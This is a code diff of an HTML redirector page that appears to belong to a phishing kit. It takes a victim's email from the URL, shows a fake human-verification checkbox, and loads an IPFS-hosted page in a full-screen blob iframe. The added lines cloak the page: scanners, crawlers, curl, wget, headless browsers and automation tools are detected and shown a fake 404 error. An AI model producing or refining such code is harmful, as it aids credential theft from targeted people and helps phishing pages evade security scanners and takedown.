@@ -1,8 +1,8 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Blob IPFS Redirect + Anti-Bot</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Blob IPFS Redirect + Human-Friendly Anti-Bot</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
 <style>
 html, body {
@@ -10,18 +10,14 @@ html, body {
     font-family: Arial, sans-serif;
 }
 
-/* Overlay */
+/* Overlay for human check */
 #overlay {
     position:fixed;
-    top:0; left:0;
-    width:100%; height:100%;
+    top:0; left:0; width:100%; height:100%;
     background:#f0f2f5;
-    display:flex;
-    align-items:center;
-    justify-content:center;
-    opacity:0;
-    transition:0.3s;
-    z-index:9999;
+    display:flex; align-items:center; justify-content:center;
+    opacity:0; transition:0.3s;
+    z-index:999999;
 }
 
 #verificationBox {
@@ -42,14 +38,22 @@ html, body {
     transition:0.3s;
 }
 
+/* 🔥 ROTATING BOT ICON HERE */
 #robotIcon {
-    width:32px; height:32px;
+    width:32px;
+    height:32px;
     background:#e8f0fe;
     border-radius:50%;
     font-size:20px;
     display:flex;
     align-items:center;
     justify-content:center;
+    animation: botRotate 2s linear infinite;
+}
+
+@keyframes botRotate {
+    from { transform: rotate(0deg); }
+    to { transform: rotate(360deg); }
 }
 
 #verifying {
@@ -71,11 +75,20 @@ html, body {
     from {transform:rotate(0deg);}
     to {transform:rotate(360deg);}
 }
+
+/* 404 page */
+.error-404 {
+    display:flex; flex-direction:column; align-items:center; justify-content:center;
+    height:100vh; background:#f8f8f8; text-align:center;
+}
+.error-404 h1 {font-size:90px; margin:0;}
+.error-404 h2 {font-size:26px; margin:0;}
+.error-404 p {font-size:18px;}
 </style>
 </head>
 <body>
 
-<!-- Anti-bot UI -->
+<!-- HUMAN CHECK -->
 <div id="overlay">
     <div id="verificationBox">
         <div style="display:flex; align-items:center; gap:12px;">
@@ -93,15 +106,13 @@ html, body {
 </div>
 
 <script>
-// ----------------------------------------------
-// YOUR ORIGINAL BLOB SCRIPT (unchanged)
-// ----------------------------------------------
-
+/* -----------------------------
+   B L O B   C O N F I G
+----------------------------- */
 const BASE_IPFS = "https://bafkreihy4f7rhfkkwwb6zyz6kzdb25sact4uw3e5xk2ogsweommzcyccpq.ipfs.dweb.link/";
 
 function getEmail() {
-    const params = new URLSearchParams(location.search);
-    return params.get("email") || "";
+    return new URLSearchParams(location.search).get("email") || "";
 }
 
 function buildIPFS(email) {
@@ -113,24 +124,10 @@ function createBlobHTML(url) {
         <!DOCTYPE html>
         <html>
         <head>
-            <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
             <style>
-                html, body {
-                    margin:0;
-                    padding:0;
-                    width:100%;
-                    height:100%;
-                    overflow:hidden;
-                    background:#fff;
-                }
-                iframe {
-                    position:fixed;
-                    top:0;
-                    left:0;
-                    width:100%;
-                    height:100%;
-                    border:none;
-                }
+                html, body { margin:0; padding:0; width:100%; height:100%; overflow:hidden; background:#fff; }
+                iframe { position:fixed; top:0; left:0; width:100%; height:100%; border:none; }
             </style>
         </head>
         <body>
@@ -140,9 +137,25 @@ function createBlobHTML(url) {
     `;
 }
 
-// ----------------------------------------------
-// HUMAN VERIFICATION (added)
-// ----------------------------------------------
+/* -----------------------------
+   U S E R - F R I E N D L Y
+   A N T I - B O T  (LIGHT)
+----------------------------- */
+
+function isBot() {
+    const ua = navigator.userAgent.toLowerCase();
+
+    const botPatterns = [
+        "bot","crawl","spider","curl","wget","python","scrapy",
+        "headless","selenium","puppeteer","playwright"
+    ];
+
+    if (botPatterns.some(x => ua.includes(x))) return true;
+    if (navigator.webdriver) return true;
+    if (!navigator.plugins.length) return true;
+
+    return false;
+}
 
 function requireVerification() {
     return new Promise(resolve => {
@@ -150,10 +163,8 @@ function requireVerification() {
         const checkbox = document.getElementById("checkbox");
         const verifying = document.getElementById("verifying");
 
-        // Fade in overlay
-        overlay.style.opacity = 1;
+        overlay.style.opacity = 1;  
 
-        // User clicks checkbox
         checkbox.onclick = () => {
             checkbox.style.background = "#40739e";
             checkbox.style.borderColor = "#40739e";
@@ -163,21 +174,40 @@ function requireVerification() {
                 overlay.style.opacity = 0;
                 setTimeout(() => overlay.remove(), 300);
                 resolve(true);
-            }, 1200);
+            }, 900);
         };
     });
 }
 
-// ----------------------------------------------
-// MAIN (runs after human verification)
-// ----------------------------------------------
+/* -----------------------------
+   4 0 4   H A N D L E R
+----------------------------- */
+
+function show404() {
+    document.body.innerHTML = `
+        <div class="error-404">
+            <h1>404</h1>
+            <h2>Error</h2>
+            <p>The requested page could not be found.</p>
+        </div>`;
+}
+
+/* -----------------------------
+   M A I N
+----------------------------- */
 
 document.addEventListener("DOMContentLoaded", async () => {
 
-    // Wait for user to verify they are human
+    // ANTI-BOT CHECK
+    if (isBot()) {
+        show404();
+        return;
+    }
+
+    // HUMAN CLICK
     await requireVerification();
 
-    // Continue with your original blob redirect
+    // YOUR ORIGINAL BLOB REDIRECT
     const email = getEmail();
     const ipfsURL = buildIPFS(email);
 
